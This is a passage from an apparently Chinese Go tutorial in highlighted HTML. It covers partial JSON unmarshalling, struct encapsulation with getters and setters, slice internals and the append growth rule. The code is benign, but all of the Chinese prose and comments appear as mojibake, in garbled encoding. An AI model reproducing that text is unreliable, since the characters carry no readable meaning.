&#123;<br>Screen01<br>Battery<br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;screenBattery) <span class="hljs-comment">//æ³¨æ„ï¼šæ­¤å¤„åªèƒ½ä¸ºç»“æ„ä½“æŒ‡é’ˆï¼ˆä¸€èˆ¬å‚æ•°ä¸ºinterface&#123;&#125;ï¼Œéƒ½é‡‡ç”¨åœ°å€å¼•ç”¨ï¼ˆå³åœ°å€ä¼ é€’ï¼‰ï¼‰</span><br>fmt.Println(<span class="hljs-string">&quot;è§£æï¼ˆåˆ†ç¦»ï¼‰éƒ¨åˆ†ç»“æ„:&quot;</span>, screenBattery)<br><span class="hljs-comment">//è‡ªå®šä¹‰åŒ¿åç»“æ„ä½“ï¼Œè§£æï¼ˆåˆ†ç¦»ï¼‰éƒ¨åˆ†ç»“æ„</span><br>batteryTouch := <span class="hljs-keyword">struct</span> &#123;<br>Battery<br>isTouch <span class="hljs-keyword">bool</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;batteryTouch)<br>fmt.Println(<span class="hljs-string">&quot;è§£æï¼ˆåˆ†ç¦»ï¼‰éƒ¨åˆ†ç»“æ„:&quot;</span>, batteryTouch)<br><span class="hljs-comment">//è‡ªå®šä¹‰åŒ¿åç»“æ„ä½“ï¼Œè§£æï¼ˆåˆ†ç¦»ï¼‰éƒ¨åˆ†ä¸å­˜åœ¨çš„ç»“æ„</span><br>temp1 := <span class="hljs-keyword">struct</span> &#123;<br>Battery<br>Detail <span class="hljs-keyword">struct</span> &#123;<br>Name  <span class="hljs-keyword">string</span><br>Price <span class="hljs-keyword">uint16</span><br>&#125;<br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;temp1)<br>fmt.Println(<span class="hljs-string">&quot;è§£æï¼ˆåˆ†ç¦»ï¼‰éƒ¨åˆ†ä¸å­˜åœ¨çš„ç»“æ„&quot;</span>, temp1)<br><span class="hljs-comment">//è‡ªå®šä¹‰åŒ¿åç»“æ„ä½“ï¼Œè§£æï¼ˆåˆ†ç¦»ï¼‰å®Œå…¨ä¸å­˜åœ¨çš„ç»“æ„</span><br>temp2 := <span class="hljs-keyword">struct</span> &#123;<br>User  <span class="hljs-keyword">string</span><br>Price <span class="hljs-keyword">uint16</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;temp2)<br>fmt.Println(<span class="hljs-string">&quot;è§£æï¼ˆåˆ†ç¦»ï¼‰å®Œå…¨ä¸å­˜åœ¨çš„ç»“æ„:&quot;</span>, temp2)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å°è£…"><a href="#å°è£…" class="headerlink" title="å°è£…"></a>å°è£…</h2><p>åœ¨Goè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ç»“æ„ä½“çš„å­—æ®µè¿›è¡Œå°è£…ï¼Œå¹¶é€šè¿‡ç»“æ„ä½“ä¸­çš„æ–¹æ³•æ¥æ“ä½œå†…éƒ¨çš„å­—æ®µã€‚å¦‚æœç»“æ„ä½“ä¸­å­—æ®µåçš„é¦–å­—æ¯æ˜¯å°å†™å­—æ¯ï¼Œé‚£ä¹ˆè¿™æ ·çš„å­—æ®µæ˜¯ç§æœ‰çš„ï¼Œç›¸å½“äºprivateå­—æ®µã€‚å¤–éƒ¨åŒ…è£¹èƒ½ç›´æ¥è®¿é—®ï¼Œå¦‚æœæ˜¯åœ¨åçš„é¦–å­—æ¯æ˜¯å¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆè¿™æ ·çš„å­—æ®µå¯¹å¤–æš´éœ²çš„ï¼Œç›¸å½“äºpublicå­—æ®µã€‚èƒ½å¤Ÿèµ·çš„æ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœæ–¹æ³•åé¦–å­—æ¯æ˜¯å¤§å†™å­—æ¯ï¼Œé‚£ä¹ˆè¿™æ ·çš„æ–¹æ³•å¯¹å¤–æš´éœ²çš„ã€‚</p><p>å°è£…çš„å¥½å¤„ï¼š</p><ul><li>éšè—å®ç°ç»†èŠ‚ï¼›</li><li>å¯ä»¥å¯¹æ•°æ®è¿›è¡ŒéªŒè¯ï¼Œä¿è¯æ•°æ®å®‰å…¨åˆç†ã€‚</li></ul><p>å¦‚ä½•ä½“ç°å°è£…ï¼š</p><ul><li>å¯¹ç»“æ„ä½“ä¸­çš„å±æ€§è¿›è¡Œå°è£…ï¼›</li><li>é€šè¿‡æ–¹æ³•ï¼ŒåŒ…ï¼Œå®ç°å°è£…ã€‚</li></ul><p>å°è£…çš„å®ç°æ­¥éª¤ï¼š</p><ol><li>å°†ç»“æ„ä½“ã€å­—æ®µçš„é¦–å­—æ¯å°å†™ï¼›</li><li>ç»™ç»“æ„ä½“æ‰€åœ¨çš„åŒ…æä¾›ä¸€ä¸ªå·¥å‚æ¨¡å¼çš„å‡½æ•°ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œç±»ä¼¼ä¸€ä¸ªæ„é€ å‡½æ•°ï¼›</li><li>æä¾›ä¸€ä¸ªé¦–å­—æ¯å¤§å†™çš„Setæ–¹æ³•ï¼ˆç±»ä¼¼å…¶å®ƒè¯­è¨€çš„publicï¼‰ï¼Œç”¨äºå¯¹å±æ€§åˆ¤æ–­å¹¶èµ‹å€¼ï¼›</li><li>æä¾›ä¸€ä¸ªé¦–å­—æ¯å¤§å†™çš„Getæ–¹æ³•ï¼ˆç±»ä¼¼å…¶å®ƒè¯­è¨€çš„publicï¼‰ï¼Œç”¨äºè·å–å±æ€§çš„å€¼ã€‚</li></ol><p>ä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> model<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">type</span> person <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-keyword">string</span><br>age <span class="hljs-keyword">int</span>   <span class="hljs-comment">//å…¶å®ƒåŒ…ä¸èƒ½ç›´æ¥è®¿é—®..</span><br>sal <span class="hljs-keyword">float64</span><br>&#125;<br><br><span class="hljs-comment">//å†™ä¸€ä¸ªå·¥å‚æ¨¡å¼çš„å‡½æ•°ï¼Œç›¸å½“äºæ„é€ å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-keyword">string</span>)</span> *<span class="hljs-title">person</span></span> &#123;<br><span class="hljs-keyword">return</span> &amp;person&#123;<br>Name : name,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//ä¸ºäº†è®¿é—®age å’Œ sal æˆ‘ä»¬ç¼–å†™ä¸€å¯¹SetXxxçš„æ–¹æ³•å’ŒGetXxxçš„æ–¹æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">SetAge</span><span class="hljs-params">(age <span class="hljs-keyword">int</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> age &gt;<span class="hljs-number">0</span> &amp;&amp; age &lt;<span class="hljs-number">150</span> &#123;<br>p.age = age<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;å¹´é¾„èŒƒå›´ä¸æ­£ç¡®..&quot;</span>)<br><span class="hljs-comment">//ç»™ç¨‹åºå‘˜ç»™ä¸€ä¸ªé»˜è®¤å€¼</span><br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">GetAge</span><span class="hljs-params">()</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> p.age<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">SetSal</span><span class="hljs-params">(sal <span class="hljs-keyword">float64</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> sal &gt;= <span class="hljs-number">3000</span> &amp;&amp; sal &lt;= <span class="hljs-number">30000</span> &#123;<br>p.sal = sal<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;è–ªæ°´èŒƒå›´ä¸æ­£ç¡®..&quot;</span>)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *person)</span> <span class="hljs-title">GetSal</span><span class="hljs-params">()</span> <span class="hljs-title">float64</span></span> &#123;<br><span class="hljs-keyword">return</span> p.sal<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;mytest/encapsulation/model&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>p := model.NewPerson(<span class="hljs-string">&quot;smith&quot;</span>)<br>p.SetAge(<span class="hljs-number">18</span>)<br>p.SetSal(<span class="hljs-number">5000</span>)<br>fmt.Println(p)<br>fmt.Println(p.Name, <span class="hljs-string">&quot; age =&quot;</span>, p.GetAge(), <span class="hljs-string">&quot; sal = &quot;</span>, p.GetSal())<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡"></a>åˆ‡ç‰‡</h2><h3 id="sliceçš„ç»“æ„ä½“"><a href="#sliceçš„ç»“æ„ä½“" class="headerlink" title="sliceçš„ç»“æ„ä½“"></a>sliceçš„ç»“æ„ä½“</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> slice <span class="hljs-keyword">struct</span> &#123;<br>    array unsafe.Pointer <span class="hljs-comment">// æŒ‡é’ˆ,æŒ‡å‘åº•å±‚æ•°ç»„</span><br>    <span class="hljs-built_in">len</span>   <span class="hljs-keyword">int</span> <span class="hljs-comment">// sliceé•¿åº¦ï¼Œå³å½“å‰sliceå¯ä»¥è®¿é—®çš„èŒƒå›´</span><br>    <span class="hljs-built_in">cap</span>   <span class="hljs-keyword">int</span> <span class="hljs-comment">// sliceå®¹é‡ï¼Œå½“å‰sliceå¯è®¿é—®åº•å±‚æ•°ç»„çš„æœ€å¤§èŒƒå›´ï¼Œå¦‚æœcapä¸å¤Ÿï¼Œåˆ™ä¼šæ‰§è¡Œæ‰©å®¹æ“ä½œ</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆ‡ç‰‡å’Œæ•°ç»„çš„å…³ç³»"><a href="#åˆ‡ç‰‡å’Œæ•°ç»„çš„å…³ç³»" class="headerlink" title="åˆ‡ç‰‡å’Œæ•°ç»„çš„å…³ç³»"></a>åˆ‡ç‰‡å’Œæ•°ç»„çš„å…³ç³»</h3><ol><li>åˆ‡ç‰‡çš„æœ¬è´¨æ˜¯æ“ä½œæ•°ç»„ï¼Œåªæ˜¯æ•°ç»„æ˜¯å›ºå®šé•¿åº¦çš„ï¼Œè€Œåˆ‡ç‰‡çš„é•¿åº¦å¯å˜çš„</li><li>åˆ‡ç‰‡æ˜¯å¼•ç”¨ç±»å‹ï¼Œå¯ä»¥ç†è§£ä¸ºå¼•ç”¨æ•°ç»„çš„ä¸€ä¸ªç‰‡æ®µï¼›è€Œæ•°ç»„æ˜¯å€¼ç±»å‹ï¼ŒæŠŠæ•°ç»„Aèµ‹å€¼ç»™æ•°ç»„Bï¼Œä¼šä¸ºæ•°ç»„Bå¼€è¾Ÿæ–°çš„å†…å­˜ç©ºé—´ï¼Œä¿®æ”¹æ•°ç»„Bçš„å€¼å¹¶ä¸ä¼šå½±å“æ•°ç»„Aã€‚è€Œåˆ‡ç‰‡ä½œä¸ºå¼•ç”¨ç±»å‹ï¼ŒæŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œæ˜¯ä¼šäº’ç›¸å½±å“çš„ã€‚</li></ol><p>åˆ‡ç‰‡çš„é•¿åº¦ï¼šå…ƒç´ çš„ä¸ªæ•°</p><p>åˆ‡ç‰‡çš„å®¹é‡ï¼šåœ¨åˆ‡ç‰‡å¼•ç”¨çš„åº•å±‚æ•°ç»„ä¸­ä»åˆ‡ç‰‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ åˆ°æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ çš„é•¿åº¦ï¼ˆå…ƒç´ æ•°é‡ï¼‰</p><p>æ‰€ä»¥åˆ¤æ–­ä¸€ä¸ªåˆ‡ç‰‡æ˜¯å¦ä¸ºç©ºï¼Œä½¿ç”¨len(s) == 0 åˆ¤æ–­ï¼Œä¸èƒ½ä½¿ç”¨ s==nil åˆ¤æ–­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">a1 := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><br>s5 := a1[:<span class="hljs-number">4</span>] <span class="hljs-comment">//[1 2 3 4]</span><br>s6 := a1[<span class="hljs-number">2</span>:] <span class="hljs-comment">//[3 4 5 6 7 8 9]</span><br>s7 := a1[:]  <span class="hljs-comment">//[1 2 3 4 5 6 7 8 9]</span><br><br>fmt.Printf(<span class="hljs-string">&quot;len(s5):%d cap(s5):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s5), <span class="hljs-built_in">cap</span>(s5)) <span class="hljs-comment">//4 9</span><br>fmt.Printf(<span class="hljs-string">&quot;len(s6):%d cap(s6):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s6), <span class="hljs-built_in">cap</span>(s6)) <span class="hljs-comment">//7 7</span><br>fmt.Printf(<span class="hljs-string">&quot;len(s7):%d cap(s7):%d\\n&quot;</span>, <span class="hljs-built_in">len</span>(s7), <span class="hljs-built_in">cap</span>(s7)) <span class="hljs-comment">//9 9</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š<strong>sliceæ˜¯å¼•ç”¨ç±»å‹</strong></p><p>å½“åº•å±‚æ•°ç»„æ”¹å˜æ—¶ï¼Œä¸ç®¡æ˜¯åˆ‡ç‰‡ï¼Œè¿˜æ˜¯åˆ‡ç‰‡å†åˆ‡ç‰‡ï¼Œå€¼éƒ½ä¼šæ”¹å˜ã€‚å› ä¸ºä»–ä»¬ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªå†…å­˜å—ï¼Œå¼•ç”¨çš„ä¸€ä¸ªå†…å­˜åœ°å€ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//å®šä¹‰æ•°ç»„</span><br>a1 := [...]<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-comment">//æœ‰æ•°ç»„åˆ‡å‰²æˆåˆ‡ç‰‡s6</span><br>s6 := a1[<span class="hljs-number">2</span>:] <span class="hljs-comment">//[3 4 5 6 7 8 9]</span><br><span class="hljs-comment">//åˆ‡ç‰‡å†æ¬¡åˆ‡ç‰‡ï¼Œèµ‹å€¼ç»™s8</span><br>s8 :=s6[<span class="hljs-number">3</span>:] <span class="hljs-comment">//[6 7 8 9]</span><br><span class="hljs-comment">//ä¿®æ”¹åŸå§‹æ•°ç»„ï¼ŒæŠŠä¸‹æ ‡ä¸º2çš„å€¼ç”±3æ”¹ä¸º333</span><br>a1[<span class="hljs-number">2</span>] = <span class="hljs-number">333</span><br><span class="hljs-comment">//æ‰“å°s6ï¼Œå‘ç°s6ä¸­çš„3ä¹Ÿå˜æˆäº†333</span><br>fmt.Println(<span class="hljs-string">&quot;s6:&quot;</span>, s6) <span class="hljs-comment">//[333 4 5 6 7 8 9]</span><br><span class="hljs-comment">//å› ä¸ºs8åŸºäºs6åˆ‡ç‰‡è€Œæˆï¼Œæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹åˆ‡ç‰‡å†åˆ‡ç‰‡çš„å¼•ç”¨ä¼ çš„</span><br>fmt.Println(<span class="hljs-string">&quot;s8:&quot;</span>, s8) <span class="hljs-comment">//[6 7 8 9]</span><br><span class="hljs-comment">//æˆ‘ä»¬æŠŠåŸå§‹æ•°ç»„ä¸‹æ ‡ä¸º5çš„å€¼ç”±6æ”¹ä¸º666</span><br>a1[<span class="hljs-number">5</span>] = <span class="hljs-number">666</span><br><span class="hljs-comment">//æ‰“å°s8åˆ‡ç‰‡ï¼Œå¾—åˆ°ç»“æœ6ä¹Ÿå˜æˆäº†666</span><br>fmt.Println(<span class="hljs-string">&quot;s8:&quot;</span>, s8) <span class="hljs-comment">//[666 7 8 9]</span><br></code></pre></td></tr></table></figure><h3 id="ç”Ÿæˆåˆ‡ç‰‡"><a href="#ç”Ÿæˆåˆ‡ç‰‡" class="headerlink" title="ç”Ÿæˆåˆ‡ç‰‡"></a>ç”Ÿæˆåˆ‡ç‰‡</h3><p>åˆå§‹åŒ–ä¸€ä¸ª slice æœ‰ä¸¤ç§æ–¹å¼:</p><ul><li>ç›´æ¥å£°æ˜: æ¯”å¦‚ <code>var s []int</code></li><li>ä½¿ç”¨ make å…³é”®å­—ï¼Œæ¯”å¦‚: <code>s := make([]int, 0)</code></li></ul><p>åŒºåˆ«ï¼š</p><ul><li>ç›´æ¥å£°æ˜ slice çš„æ–¹å¼å†…éƒ¨æ˜¯ä¸ç”³è¯·å†…å­˜ç©ºé—´çš„ï¼Œslice å†…éƒ¨ array æŒ‡é’ˆæŒ‡å‘ nullã€‚</li><li>ä½¿ç”¨ make å…³é”®å­—<strong>ä¼šç”³è¯·åŒ…å« 0 ä¸ªå…ƒç´ çš„å†…å­˜ç©ºé—´</strong>ï¼Œåº•å±‚ array æŒ‡é’ˆæŒ‡å‘ç”³è¯·çš„å†…å­˜ã€‚</li></ul><p>ä½¿ç”¨json.Marshalåºåˆ—åŒ–çš„ç»“æœæ˜¯æœ‰åŒºåˆ«çš„ã€‚</p><ul><li>json.Marshal(ç›´æ¥å£°æ˜): è¿”å› null</li><li>json.Marshal(makeå…³é”®å­—åˆå§‹åŒ–): è¿”å› []</li></ul><p><strong>make()å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ‡ç‰‡çš„æ•°ç»„ç±»å‹ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šåˆ‡ç‰‡çš„é•¿åº¦ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šåˆ‡ç‰‡çš„å®¹é‡ã€‚</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s1 := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;s1ï¼š%v len(s1)ï¼š%d cap(s1)ï¼š%d\\n&quot;</span>, s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))<br></code></pre></td></tr></table></figure><h3 id="æ‰©å®¹æœºåˆ¶"><a href="#æ‰©å®¹æœºåˆ¶" class="headerlink" title="æ‰©å®¹æœºåˆ¶"></a>æ‰©å®¹æœºåˆ¶</h3><p>åªæœ‰ append æ“ä½œå¯ä»¥è§¦å‘ slice çš„æ‰©å®¹</p><p>slice åœ¨åˆå§‹åŒ–æ—¶åªä¼šç”³è¯·æœ‰é™çš„å†…å­˜ç©ºé—´ï¼Œè€Œéšç€ append å…ƒç´ çš„å¢å¤šï¼Œå½“å…ƒç´ è¶…è¿‡å½“å‰ slice çš„ cap ï¼Œå°±ä¼šé‡æ–°ç”³è¯·ä¸€æ®µæ–°å†…å­˜ï¼ŒæŠŠåŸæ•°æ® copy åˆ°è¿™ä¸ªæ–°å†…å­˜ä¸Šï¼Œç„¶å slice æŠŠå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘è¿™æ®µæ–°å†…å­˜ã€‚</p><ol><li>å¦‚æœæ–°ç”³è¯·å®¹é‡ï¼ˆcapï¼‰å¤§äº2å€çš„æ—§å®¹é‡ï¼ˆold.capï¼‰ï¼Œæœ€ç»ˆå®¹é‡ï¼ˆnewcapï¼‰å°±æ˜¯æ–°ç”³è¯·çš„å®¹é‡ï¼ˆcapï¼‰</li><li>å¦‚æœæ—§åˆ‡ç‰‡çš„é•¿åº¦å°äº1024ï¼Œåˆ™æœ€ç»ˆå®¹é‡(newcap)å°±æ˜¯æ—§å®¹é‡(old.cap)çš„ä¸¤å€ï¼Œå³ï¼ˆnewcap=doublecapï¼‰</li><li>å¦‚æœæ—§åˆ‡ç‰‡é•¿åº¦å¤§äºç­‰äº1024ï¼Œåˆ™æœ€ç»ˆå®¹é‡ï¼ˆnewcapï¼‰ä»æ—§å®¹é‡ï¼ˆold.capï¼‰å¼€å§‹å¾ªç¯å¢åŠ åŸæ¥çš„ 1/4ï¼Œå³ï¼ˆnewcap=old.cap,for {newcap += newcap/4}ï¼‰ç›´åˆ°æœ€ç»ˆå®¹é‡ï¼ˆnewcapï¼‰å¤§äºç­‰äºæ–°ç”³è¯·çš„å®¹é‡(cap)ï¼Œå³ï¼ˆnewcap &gt;= capï¼‰</li><li>å¦‚æœæœ€ç»ˆå®¹é‡ï¼ˆcapï¼‰è®¡ç®—å€¼æº¢å‡ºï¼Œåˆ™æœ€ç»ˆå®¹é‡ï¼ˆcapï¼‰å°±æ˜¯æ–°ç”³è¯·å®¹é‡ï¼ˆcapï¼‰</li></ol><p>æºç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">newcap := old.<span class="hljs-built_in">cap</span><br>    doublecap := newcap + newcap <span class="hljs-comment">// ä¸¤å€æ‰©å®¹</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">cap</span> &gt; doublecap &#123; <span class="hljs-comment">// å¾…æ‰©å®¹å¤§å°å¤§äºåŸåˆ‡ç‰‡çš„ä¸¤å€ï¼Œåˆ™æŒ‰ç…§å¾…æ‰©å®¹å¤§å°å¤„ç†</span><br>        newcap = <span class="hljs-built_in">cap</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> old.<span class="hljs-built_in">len</span> &lt; <span class="hljs-number">1024</span> &#123; <span class="hljs-comment">// å½“åŸåˆ‡ç‰‡é•¿åº¦å°äº1024æ—¶ï¼Œæ–°åˆ‡ç‰‡çš„å®¹é‡ä¼šç›´æ¥ç¿»å€ã€‚</span><br>            newcap = doublecap<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// å½“åŸåˆ‡ç‰‡çš„å®¹é‡å¤§äºç­‰äº1024æ—¶ï¼Œä¼šåå¤åœ°å¢åŠ 25%ï¼Œç›´åˆ°æ–°å®¹é‡è¶…è¿‡æ‰€éœ€è¦çš„å®¹é‡ã€‚</span><br>            <span class="hljs-comment">// Check 0 &lt; newcap to detect overflow</span><br>            <span class="hljs-comment">// and prevent an infinite loop.</span><br>            <span class="hljs-keyword">for</span> <span class="hljs-number">0</span> &lt; newcap &amp;&amp; newcap &lt; <span class="hljs-built_in">cap</span> &#123;<br>                newcap += newcap / <span class="hljs-number">4</span><br>            &#125;<br>            <span class="hljs-comment">// Set newcap to the requested cap when</span><br>            <span class="hljs-comment">// the newcap calculation overflowed.</span><br>            <span class="hljs-keyword">if</span> newcap &lt;= <span class="hljs-number">0</span> &#123;<br>                newcap = <span class="hljs-built_in">cap</span><br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>demo</p><p>å¦‚æœåœ¨å‡½æ•°å†…éƒ¨å‘ç”Ÿäº†æ‰©å®¹ï¼Œè¿™æ—¶å†ä¿®æ”¹ slice ä¸­çš„å€¼æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› ä¸ºä¿®æ”¹å‘ç”Ÿåœ¨æ–°çš„ array å†…å­˜ä¸­ï¼Œå¯¹è€çš„ array å†…å­˜ä¸èµ·ä½œç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">int</span>, <span class="hljs-number">3</span>,<span class="hljs-number">8</span>)<br>s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span><br>s[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>s[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 1 2] 8</span><br>s1 := s;<br><span class="hljs-comment">// æŒ‡å‘åŒä¸€æ•°ç»„ï¼ˆsè¿˜æœ‰å®¹é‡å¯ä»¥æ‰©å®¹ï¼Œæ‰€ä»¥å…¶å®så’Œs1å…¶å®æ˜¯éƒ½æŒ‡å‘åŒä¸€æ•°ç»„çš„ï¼Œå¯ä»¥ç†è§£ä¸ºæµ…æ‹·è´ï¼‰</span><br>s1 = <span class="hljs-built_in">append</span>(s,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br>s1[<span class="hljs-number">1</span>] = <span class="hljs-number">123</span><br>fmt.Println(<span class="hljs-string">&quot;s =&quot;</span>,s, <span class="hljs-built_in">cap</span>(s)) <span class="hljs-comment">//s = [0 123 2] 8</span><br>fmt.Println(<span class="hljs-string">&quot;s1=&quot;</span>,s1, <span class="hljs-built_in">cap</span>(s1)) <span class="hljs-comment">//s1= [0 123 2 3 4] 8</span><br><br><span class="hljs-comment">// 